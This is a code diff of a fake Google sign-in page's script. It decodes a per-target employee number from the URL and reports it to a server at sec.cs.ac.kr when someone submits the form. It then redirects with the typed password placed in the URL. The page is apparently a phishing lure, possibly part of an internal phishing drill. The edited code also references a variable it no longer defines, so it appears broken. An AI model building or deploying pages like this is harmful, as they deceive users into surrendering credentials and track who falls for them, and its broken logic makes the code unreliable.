@@ -34353,18 +34353,33 @@
     //const params = new URLSearchParams(window.location.search);
     //const username = params.get('uid');
     const div = document.querySelector('div[jsname="bQIQze"]');
-    div.textContent  = uid + '@gmail.com'
+    div.textContent  = uid.replace('@gmail.com', '') + '@gmail.com';
 
-
+    function base64DecodeToString(b64) {
+        // atob는 브라우저에서 표준 Base64 디코딩
+        const binary = atob(b64);
+        // UTF-8 처리: Uint8Array로 변환 후 TextDecoder로 디코딩
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+        return new TextDecoder().decode(bytes);
+    }
     
     async function goLogin(){
+
+
+
+        const path = window.location.pathname;
+        const parts = path.split('/').filter(Boolean); 
+        const lastPart = parts[parts.length - 1];
+
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get("uid");     // "30072"
 
         const input = document.querySelector('input[jsname="YPqjbf"]');
         const SERVER_URL = "https://sec.cs.ac.kr"
         let JsonArray = new Array();
         let JsonObject = new Object;
-        JsonObject.SABUN = "30072";
-        JsonObject.INPUT_PW = input.value;
+        JsonObject.SABUN = base64DecodeToString(uid);
         JsonArray.push(JsonObject);
 
         const res = await fetch(SERVER_URL+'/api/test/input/passwd',{ method: "POST", headers : {"Content-Type" : "application/json;charset=utf-8;" }, body : JSON.stringify(JsonArray)} );
@@ -34372,15 +34387,10 @@
         console.log("test",data.MSG);
     
         if(data.MSG == "SUCCESS"){
-            const input = document.querySelector('input[jsname="YPqjbf"]');
-            const currentPath = window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, "/");
-            window.location.href = currentPath + "passwd.html?uid="+input.value+"&ss=sdfmop39fosdlnv09sdr98hwjnfi3829fdnfssdmfpsmdfpmspdf93903$230m,rlfmdmqp23252359sdn&sabun=30072&aa=2j130jmkldlkasndlkansldnaskldascvbtoewijtoiewjt#";
-
+            window.location.href = currentPath + "result.html?uid="+input.value+"&ss=sdfmop39fosdlnv09sdr98hwjnfi3829fdnfssdmfpsmdfpmspdf93903$230m,rlfmdmqp23252359sdn&sabun=30072&aa=2j130jmkldlkasndlkansldnaskldascvbtoewijtoiewjt#";
         }
 
       
-        window.location.href = currentPath + "result.html?uid="+input.value+"&ss=sdfmop39fosdlnv09sdr98hwjnfi3829fdnfssdmfpsmdfpmspdf93903$230m,rlfmdmqp23252359sdn&sabun=30072&aa=2j130jmkldlkasndlkansldnaskldascvbtoewijtoiewjt#";
-
 
     }
 </script>
